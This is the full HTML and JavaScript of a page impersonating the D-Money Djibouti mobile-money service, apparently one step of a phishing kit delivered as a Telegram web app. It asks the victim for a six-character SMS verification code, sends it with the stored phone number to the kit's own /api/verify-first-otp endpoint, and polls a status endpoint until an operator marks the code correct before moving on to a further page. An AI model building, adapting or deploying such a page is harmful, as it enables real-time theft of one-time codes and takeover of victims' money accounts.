<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>D-Money Djibouti - Vérification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --bg-color: #f7f9fa; --card-bg: #ffffff; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
        .header-box { width: 100%; background: var(--dmoney-dark); padding: 25px 20px 40px 20px; color: white; text-align: center; font-size: 26px; font-weight: 800; border-bottom: 4px solid var(--dmoney-yellow); }
        .main-container { width: 100%; display: flex; justify-content: center; margin-top: -20px; flex-grow: 1; }
        .card { background: var(--card-bg); width: 90%; max-width: 400px; padding: 30px 20px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #edf2f7; align-self: flex-start; }
        h2 { margin: 0 0 12px 0; font-size: 22px; color: #111111; font-weight: 800; text-align: center; }
        .instruction { font-size: 14px; color: #666666; margin: 0 0 12px 0; line-height: 1.4; text-align: center; }
        .phone-number { font-size: 16px; font-weight: 800; color: #111111; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .code-input-container { display: flex; justify-content: space-between; gap: 6px; margin-bottom: 20px; }
        .code-box { width: 48px; height: 54px; border: 2px solid var(--dmoney-yellow); border-radius: 10px; text-align: center; font-size: 22px; font-weight: 800; outline: none; text-transform: uppercase; background: #fffdf4; }
        .submit-btn { width: 100%; background-color: #e0e0e0; color: #999999; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .submit-btn.active { background-color: var(--dmoney-yellow); color: var(--dmoney-dark); cursor: pointer; box-shadow: 0 4px 12px rgba(255, 204, 0, 0.3); }
        .footer-banner { width: 100%; background: var(--dmoney-dark); height: 80px; border-top: 4px solid var(--dmoney-yellow); margin-top: 40px; }
        .overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(17,17,17,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; color: white; text-align: center; padding: 24px; }
        .spinner { width: 56px; height: 56px; border: 5px solid rgba(255,255,255,0.3); border-top: 5px solid var(--dmoney-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 24px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-message { color: #e74c3c; font-size: 13px; margin-top: 10px; display: none; text-align: center; font-weight: 600; }
    </style>
</head>
<body>

<div class="header-box">D-Money</div>

<div class="main-container">
    <div class="card">
        <h2>Vérification SMS</h2>
        <p class="instruction">Entrez le code de vérification à 6 caractères reçu par SMS</p>
        <div class="phone-number"><span>🇩🇯</span><span id="displayPhone">+253 ...</span></div>

        <div class="code-input-container">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
            <input type="text" maxlength="1" class="code-box" autocomplete="off">
        </div>

        <div id="errorText" class="error-message">Le code saisi est incorrect ou a expiré.</div>
        <div style="text-align:center; color:#666; font-size:14px; margin:20px 0;" id="timerBox">Renvoyer dans <span id="timer">60</span>s</div>
        <button id="submitBtn" class="submit-btn" disabled>VALIDER</button>
    </div>
</div>
<div class="footer-banner"></div>

<div class="overlay" id="statusOverlay">
    <div class="spinner"></div>
    <div style="font-size: 22px; font-weight: 800; color:var(--dmoney-yellow);">Veuillez patienter...</div>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {
    const displayPhone = document.getElementById('displayPhone');
    const codeBoxes = document.querySelectorAll('.code-box');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');
    const statusOverlay = document.getElementById('statusOverlay');
    const errorText = document.getElementById('errorText');
    let checkInterval = null;

    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone');
    if (savedPhone) displayPhone.textContent = `+253 ${savedPhone}`;

    codeBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
            if (box.value && index < codeBoxes.length - 1) codeBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) codeBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const fullCode = Array.from(codeBoxes).map(b => b.value).join('');
        const isComplete = fullCode.length === 6;
        submitBtn.disabled = !isComplete;
        submitBtn.classList.toggle('active', isComplete);
        errorText.style.display = 'none';
    }

    let timeLeft = 60;
    const timerInterval = setInterval(() => {
        timeLeft--;
        if (timerEl) timerEl.textContent = timeLeft;
        if (timeLeft <= 0) clearInterval(timerInterval);
    }, 1000);

    function startStatusPolling() {
        if (checkInterval) clearInterval(checkInterval);
        checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                const data = await res.json();
                if (data.status === "otp1_correct") {
                    clearInterval(checkInterval);
                    window.location.href = "/page9";
                }
            } catch (err) { console.error(err); }
        }, 2000);
    }

    submitBtn.addEventListener('click', async () => {
        if (submitBtn.disabled) return;
        const codeValue = Array.from(codeBoxes).map(b => b.value).join('');
        statusOverlay.style.display = "flex";

        try {
            const res = await fetch('/api/verify-first-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: savedPhone, code: codeValue, country: "DJ" })
            });
            const responseData = await res.json();
            if (responseData.success) startStatusPolling();
        } catch (err) { statusOverlay.style.display = "none"; }
    });

    if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
});
</script>
</body>
</html>
